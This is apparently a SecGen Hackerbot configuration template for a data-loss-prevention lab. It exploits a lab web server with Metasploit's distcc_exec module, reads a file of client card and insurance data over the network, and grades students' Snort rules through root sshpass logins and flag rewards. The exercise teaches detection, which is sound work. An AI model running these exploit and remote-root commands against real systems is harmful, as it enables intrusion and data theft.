<%
  require 'json'
  require 'securerandom'
  require 'digest/sha1'
  require 'fileutils'
  require 'erb'

  if self.accounts.empty?
    abort('Sorry, you need to provide an account')
  end

  $first_account = JSON.parse(self.accounts.first)
  $second_account = JSON.parse(self.accounts[1])

  $files = []
  $log_files = []
  if $second_account.key?("leaked_filenames") &&  $second_account['leaked_filenames'].size > 0
    $files = $second_account['leaked_filenames']
    $log_files = $second_account['leaked_filenames'].grep(/log/)
  end

  if $files.empty?
    $files = ['myfile', 'afile', 'filee', 'thefile']
  end
  if $log_files.empty?
    $log_files = ['log', 'thelog', 'logs', 'frogonalog']
  end

  $main_user = $first_account['username'].to_s
  $main_user_pass = $first_account['password'].to_s
  $second_user = $second_account['username'].to_s
  $example_file = "/home/#{$second_user}/#{$files.sample}"
  $example_dir = "/home/#{$second_user}/personal_secrets/"

  $web_server_ip = self.web_server_ip.first
  $ids_server_ip = self.ids_server_ip.first
  $hackerbot_server_ip = self.hackerbot_server_ip.first
  $root_password = self.root_password
  $flags = self.flags

  $sensitive_files_location = "/home/#{$main_user}/trade_secrets/"

  REQUIRED_FLAGS = 4
  while $flags.length < REQUIRED_FLAGS
    $flags << "flag{#{SecureRandom.hex}}"
    Print.err "Warning: Not enough flags provided to hackerbot_config generator, some flags won't be tracked/marked!"
  end

  def get_binding
    binding
  end
-%>
<?xml version="1.0"?>

<hackerbot
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xsi:schemaLocation="http://www.github/cliffe/SecGen/hackerbot">
<!--<hackerbot xmlns="http://www.github/cliffe/SecGen/hackerbotz"-->

	<name>Hackerbot</name>

	<AIML_chatbot_rules>config/AIML</AIML_chatbot_rules>

	<!--Method for gaining shell access, can be overwritten per-attack-->
	<!--<get_shell>bash</get_shell>-->
	<get_shell>false</get_shell>

	<messages>
		<show_attack_numbers />

		<greeting>Just thought you should know, I am going to hack your servers and steal your data... If only all attackers were so thoughtful to give you a heads up! You will need to keep track of when your sensitive files are transferred on the network, and keep track of any copies of the files.</greeting>

		<!--Must provide alternatives for each message-->
		<say_ready>When you are ready, simply say 'ready'.</say_ready>
		<say_ready>'Ready'?</say_ready>
		<next>Ok, I'll do what I can to move things along...</next>
		<next>Moving things along to the next one...</next>
		<previous>Ok, I'll do what I can to back things up...</previous>
		<previous>Ok, backing up.</previous>
		<goto>Ok, skipping it along.</goto>
		<goto>Let me see what I can do to goto that attack.</goto>
		<last_attack>That was the last one for now. You can rest easy, until next time... (End.)</last_attack>
		<last_attack>That was the last one. Game over?</last_attack>
		<first_attack>You are back to the beginning!</first_attack>
		<first_attack>This is where it all began.</first_attack>
		<getting_shell>Doing my thing...</getting_shell>
		<getting_shell>Here we go...</getting_shell>
		<got_shell>...</got_shell>
		<got_shell>....</got_shell>
		<repeat>Let me know when you are 'ready', if you want to move on say 'next', or 'previous' and I'll move things along.</repeat>
		<repeat>Say 'ready', 'next', or 'previous'.</repeat>

		<!--Single responses:-->
		<help>I am waiting for you to say 'ready', 'next', 'previous', 'list', 'goto *X*', or 'answer *X*'</help>
		<say_answer>Say "The answer is *X*".</say_answer>
		<no_quiz>There is no question to answer</no_quiz>
		<correct_answer>Correct</correct_answer>
		<incorrect_answer>Incorrect</incorrect_answer>
		<invalid>That's not possible.</invalid>
		<non_answer>Wouldn't you like to know.</non_answer>

		<!--can be overwritten per-attack-->
		<shell_fail_message>Oh no. Failed to get shell... You need to let us in.</shell_fail_message>
	</messages>

	<tutorial_info>
		<title>DLP</title>
		<tutorial><%= ERB.new(File.read self.templates_path + 'intro.md.erb').result(self.get_binding) %></tutorial>
		<footer>
<%= File.read self.templates_path + 'resources.md.erb' %>

<%= File.read self.templates_path + 'license.md.erb' %>

Randomised instance generated by [SecGen](http://github.com/cliffe/SecGen) (<%= Time.new.to_s %>)
		</footer>

		<provide_tutorial>true</provide_tutorial>

	</tutorial_info>

	<attack>
<% $rand_alert0 = SecureRandom.hex(3)
   $rand_tmp_restingplace = "/tmp/#{SecureRandom.hex(3)}" %>
		<!--get the snort alerts before-->
		<!--and make a copy of the file to a new location -->
		<pre_shell>sshpass -p <%= $root_password %> ssh -oStrictHostKeyChecking=no root@<%= $web_server_ip %> 'cp <%= $sensitive_files_location %>clients.csv <%= $rand_tmp_restingplace %>; chmod 644 <%= $rand_tmp_restingplace %>'; stat0=$?; echo -$stat0; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; echo --$?</pre_shell>
		<!--exploit and read contents of sensitive file over the network-->
		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; exploit"</get_shell>
		<!--trigger the rule by sending the data-->
		<post_command>cat <%= $rand_tmp_restingplace %>; echo --$?</post_command>
		<!--get the snort alerts after, and diff for new alerts generated-->
		<post_shell>sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; echo --$?; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5 | grep <%= $rand_alert0 %> >/dev/null; echo triggered:$?; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/etc/snort/rules/local.rules /tmp/snort_rules; echo rules:$?; grep '^alert' /tmp/snort_rules | grep '<%= $rand_alert0 %>' | grep -E '(content|pcre) ?: ?"' >/dev/null; echo good_rule:$? </post_shell>
		<suppress_command_output_feedback />

		<prompt>You need to monitor your sensitive list of clients. The file contains credit card details and national insurance numbers. You have a copy in <%= $sensitive_files_location %>clients.csv Use one or more Snort rules to detect unencrypted transport of the file. The alert must include the message "<%= $rand_alert0 %>". (This attack may take a while.)</prompt>

		<condition>
			<output_matches>good_rule:1</output_matches>
			<message>:( Couldn't find your snort rule on the IDS server in /etc/snort/rules/local.rules. You are missing content matching or the message from your rule.</message>
		</condition>
		<condition>
			<output_matches>triggered:1</output_matches>
			<message>:( Your rule wasn't triggered.</message>
		</condition>
		<condition>
			<output_matches>triggered:0.*good_rule:0</output_matches>
			<message>:) Well done! <%= $flags.pop %>.</message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>--1</output_matches>
			<message>:( Failed to scp to the ids server (<%= $ids_server_ip %>)</message>
		</condition>
		<condition>
			<output_matches>-1</output_matches>
			<message>:( Failed to ssh to the web server (<%= $web_server_ip %>)</message>
		</condition>
		<condition>
			<output_matches>--0</output_matches>
			<message>Continuing...</message>
		</condition>
		<else_condition>
			<message>:( Something was not quite right...</message>
		</else_condition>

		<tutorial><%= ERB.new(File.read self.templates_path + 'dlp.md.erb').result(self.get_binding) %></tutorial>
	</attack>

	<attack>
<% $rand_alert2 = SecureRandom.hex(3)
   $rand_tmp_restingplace_fake = "/tmp/#{SecureRandom.hex(3)}"  %>
		<!--get the snort alerts before-->
		<!--and make a copy of the file to a new location -->
		<pre_shell>sshpass -p <%= $root_password %> ssh -oStrictHostKeyChecking=no root@<%= $web_server_ip %> 'cp <%= $sensitive_files_location %>fake_clients.csv <%= $rand_tmp_restingplace_fake %>; chmod 644 <%= $rand_tmp_restingplace_fake %>'; stat0=$?; echo -$stat0; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; echo --$?</pre_shell>
		<!--exploit and read contents of sensitive file over the network-->
		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; exploit"</get_shell>
		<!--trigger the rule by sending the data-->
		<post_command>cat <%= $rand_tmp_restingplace_fake %>; echo --$?</post_command>
		<!--get the snort alerts after, and diff for new alerts generated-->
		<post_shell>sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; echo --$?; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5 | grep <%= $rand_alert2 %> >/dev/null; echo triggered:$?; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/etc/snort/rules/local.rules /tmp/snort_rules; echo rules:$?; grep '^alert' /tmp/snort_rules | grep '<%= $rand_alert2 %>' | grep -E 'pcre ?: ?"' >/dev/null; echo good_rule:$? </post_shell>
		<suppress_command_output_feedback />

		<prompt>Update your rule so that it also matches the fake_clients file. Use REGEXP so that your rule doesn't include any of the actual data. You have a copy in <%= $sensitive_files_location %>fake_clients.csv Use one or more Snort rules to detect unencrypted transport of either of the files. The alert must include the message "<%= $rand_alert2 %>".</prompt>

		<condition>
			<output_matches>good_rule:1</output_matches>
			<message>:( Couldn't find your snort rule on the IDS server in /etc/snort/rules/local.rules. You are missing *regular expression* matching or the message from your rule.</message>
		</condition>
		<condition>
			<output_matches>triggered:1</output_matches>
			<message>:( Your rule wasn't triggered.</message>
		</condition>
		<condition>
			<output_matches>triggered:0.*good_rule:0</output_matches>
			<message>:) Well done! <%= $flags.pop %>.</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>--1</output_matches>
			<message>:( Failed to scp to the ids server (<%= $ids_server_ip %>)</message>
		</condition>
		<condition>
			<output_matches>-1</output_matches>
			<message>:( Failed to ssh to the web server (<%= $web_server_ip %>)</message>
		</condition>
		<condition>
			<output_matches>--0</output_matches>
			<message>Continuing...</message>
		</condition>
		<else_condition>
			<message>:( Something was not quite right...</message>
		</else_condition>


		<quiz>
			<question>Where else is the sensitive data at rest across the various server VMs for the lab? Use regexp searches to find the file (don't use hashes).</question>
			<answer><%= $rand_tmp_restingplace %></answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>


  <!-- requires use a version of snort that supports protected_content (2.9.7+ as found in Debian Stretch) -->
	<attack>
<% $rand_alert1 = SecureRandom.hex(3) %>
		<!-- get the snort alerts before -->
		<!-- and make a copy of the file to a new location  -->
		<pre_shell>sshpass -p <%= $root_password %> ssh -oStrictHostKeyChecking=no root@<%= $web_server_ip %> 'cp <%= $sensitive_files_location %>clients.csv <%= $rand_tmp_restingplace %>; chmod 644 <%= $rand_tmp_restingplace %>'; stat0=$?; echo -$stat0; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; echo --$?</pre_shell>
		<!-- exploit and read contents of sensitive file over the network -->
		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; exploit"</get_shell>
		<!-- trigger the rule by sending the data -->
		<post_command>cat <%= $rand_tmp_restingplace %>; echo --$?</post_command>
		<!-- get the snort alerts after, and diff for new alerts generated -->
		<post_shell>sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; echo --$?; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5 | grep <%= $rand_alert1 %> >/dev/null; echo triggered:$?; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/etc/snort/rules/local.rules /tmp/snort_rules; echo rules:$?; grep '^alert' /tmp/snort_rules | grep '<%= $rand_alert1 %>' | grep -E 'protected_content ?: ?"' >/dev/null; echo good_rule:$? </post_shell>
		<suppress_command_output_feedback />

		<prompt>Update your rule so that it doesn't contain any of the sensitive data. Use hash-based matching. You have a copy in <%= $sensitive_files_location %>clients.csv Use one or more Snort rules to detect unencrypted transport of the file. The alert must include the message "<%= $rand_alert1 %>".</prompt>

		<condition>
			<output_matches>good_rule:1</output_matches>
			<message>:( Couldn't find your snort rule on the IDS server in /etc/snort/rules/local.rules. You are missing *protected_content* matching or the message from your rule.</message>
		</condition>
		<condition>
			<output_matches>triggered:1</output_matches>
			<message>:( Your rule wasn't triggered. Hints: you don't know where in the packet the protected content will be so you can first have a content rule based on something you know will come first, and specify a distance between that and the protected content.</message>
		</condition>
		<condition>
			<output_matches>triggered:0.*good_rule:0</output_matches>
			<message>:) Well done! <%= $flags.pop %>.</message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>--1</output_matches>
			<message>:( Failed to scp to the ids server (<%= $ids_server_ip %>)</message>
		</condition>
		<condition>
			<output_matches>-1</output_matches>
			<message>:( Failed to ssh to the web server (<%= $web_server_ip %>)</message>
		</condition>
		<condition>
			<output_matches>--0</output_matches>
			<message>Continuing...</message>
		</condition>
		<else_condition>
			<message>:( Something was not quite right...</message>
		</else_condition>
	</attack>

</hackerbot>
